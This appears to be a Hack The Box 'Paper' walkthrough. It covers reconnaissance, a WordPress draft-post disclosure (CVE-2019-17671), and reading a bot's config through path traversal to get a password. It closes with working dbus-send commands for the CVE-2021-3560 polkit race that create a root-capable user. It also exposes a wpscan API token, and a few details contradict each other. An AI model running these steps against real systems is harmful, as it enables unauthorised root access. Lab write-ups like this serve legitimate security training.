>[!tldr] Paper is an easy Linux machine that features an #Apache_server on ports 80 and 443, which are serving the HTTP and HTTPS versions of a website respectively. The website on port 80 returns a default server webpage but the HTTP response header reveals a hidden domain. This hidden domain is running a WordPress blog, whose version is vulnerable to #CVE-2019-17671. This vulnerability allows us to view the confidential information stored in the draft posts of the blog, which reveal another URL leading to an employee chat system. This chat system is based on Rocketchat. Reading through the chats we find that there is a bot running which can be queried for specific information. We can exploit the bot functionality to obtain the password of a user on the system. Further host enumeration reveals that the sudo version is vulnerable to #CVE-2021-3560 and can be exploited to elevate to root privileges.

# Guided Mode
---
1. `How many TCP ports are open on the remote host?`
	1. Ill start with a `nmap` scan
```shell
❯ nmap -sT -p- 10.129.136.31
<SNIP>
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```
- Flag #1 -> `3`

---
2. `What is the domain for the Wordpress blog?`
	1. I used curl to find the domain from the response headers
```shell
❯ curl http://10.129.136.31:80/ -D paper-header

❯ nano paper-header
HTTP/1.1 403 Forbidden
Date: Tue, 18 Aug 2026 22:06:41 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
<SNIP>
```
- As we can see from the "X-Backend-Server" we get the domain 
- Flag #2 -> `office.paper`

---
3. `Which 2019 CVE is the wordpress version vulnerable to?`
	1. I will then use `wpscan` to scan for wordpress vulnerabilities
```shell
❯ wpscan --url http://office.paper/ --enumerate --api-token 1YaO9sPVB5VOoG5OTQ1dDOe2P7Ax669AaU6YGFTz8Tg -o paper_wpscan.txt

<SNIP>
| [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     UUID: 3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
<SNIP>
```
- After trying a few answers this is the CVE HTB is looking for
- Flag #3 -> `CVE-2019-17671`

---
4. `What is the secret registration URL of the employee chat system?`
	1. To find more content we can use the CVE we found earlier (`CVE-2019-17671`). 
	2. In order to use the CVE we need to change the url
		1. `order` with `asc` or `desc`
		2. `orderby`
		3. `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format
	3. So the url became -> `office.paper/?static=1&order=desc`
	4. We then found the hidden URL:
- Flag #4 -> `http://chat.office.paper/register/8qozr226AhkCHZdyY`

---
5. `What is the name of the bot running on the Rocket Chat instance?`
	1. I decide to make a account through `Rocket Chat` via the url we found before. In a general chat i read the chat history to discover employee "dwight" added a bot called `recyclops`
- Flag #5 -> `recyclops`

---
6. `Which recyclops commands allows listing files?`
- Flag #6 -> `list`

---
7. `What is the file name of the file that contains the configuration information of hubot running on the chat system?`
	1. After some enumeration I found `list` -> `ls` and `file` -> `cat` equivalents.
	2. Online i learned that the config file for hubot is `.env`
- Flag #7 -> `.env`

---
8. `What is the password obtained from that configuration information?`
	1. To get output from the `.env` file first we have to find it
	2. After finding `.env` in `../hubot/.env` we use `file` in order to read the file
		1. `recyclops`:`Queenofblad3s!23`
- Flag #9 -> `Queenofblad3s!23`

---
10. `Which regular user with a home directory exists on Paper other than rocketchat?`
	1. `list ../../` will bring use back two directories, showing us the only user with a home directory
- Flag #10 -> `dwight`

---
- User Flag:
	1. I tried to `file ../user.txt` to see if hubot can retrieve the user flag but my permissions were denied
	2. Instead I SSH'd into `dwight`:`Queenofblad3s!23` which worked!
```shell
[dwight@paper ~]$ l cat user.txt
[REDACTED_FLAG]
```
- User Flag -> `[REDACTED_FLAG]`

---
11. `What is the polkit version on the remote host?`
	1. `which polkit` but it is not in bins...
	2. The following gets `polkit` from `rpm` which is the package manager
		1. `rpm -qa polkit`
- Flag #11 -> `0.115-6`

---
12. `What is the 2021 CVE ID for the vulnerability in this version of polkit related to bypassing credential checks for D-Bus requests?`
	1. I searched up `polkit 0.115-6 vuln` and found the CVE
- Flag #12 -> `CVE-2021-3560`

---
- Root Flag:
>[!danger] There is a time limit to execute all the directions in the following steps. So, if not working then the problem is you are too slow!
- 
	1. The following are the steps to exploit `CVE-2021-3560`:
		1. Make sure the following packages are installed, i used `rpm -qa` and got both their versions too 
			1. `gnome-control-center` and `accountsservice`
			2. `rpm -qa gnome-control-center accountsservice`
			
		2. To avoid repeatedly triggering the authentication dialog box, run from a SSH session
			1. `ssh localhost` -> Pass:`Queenofblad3s!23`
			
		3. The vulnerability is triggered by starting a `dbus-send` command but killing it while polkit is still in the middle of processing the request. We need to find its processing speed to continue:
			1. `time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1`
				1. `real`	0m0.060s
				2. `user`	0m0.001s
				3. `sys`	0m0.005s
			
		4. You then take the `real` variable, and modify the bash to kill when its half the `real` variable. 
			1. `dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.030s ; kill $!`
			2. You might need to run that a few times, and you might need to experiment with the number of milliseconds in the delay. When the exploit succeeds, you’ll see that a new user named `boris` has been created: `id boris`
			
		5. `boris` is a member of the `sudo` group, you can set a password for the new account. The D-Bus interface expects a hashed password, which you can create using `openssl`: 
			1. `openssl passwd -5 iaminvincible!` -> 
			2. `$5$TDKSHzaX8iNHubDJ$cHlji8xfk7414tHMJpWnjUC6AYYfEAcZCsvau1Fn7J8`
			
		6. Now you just have to do the same trick again, except this time call the `SetPassword` D-Bus method:
			1. Variables to change
				1. `User<numer>`: Find -> `id boris`
				2. `SetPassword strinL'<hash>'`: Find `openssl passwd -5 iaminvincible!`
				
			2. `dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$Ajq3A65QFxqdbbv9$izI5J1jk4eRld4RG75scz1JWmbOeiC7s7BwwmIO7D10' string:GoldenEye & sleep 0.030s ; kill $!`
			
		7. `su - boris` to change accounts to `boris`:`iaminvincible!`
		8. `sudo su` with the same password `iaminvincible!`
	2. After some simple enumeration i found `root.txt` which had the flag
- Root Flag -> `[REDACTED_FLAG]`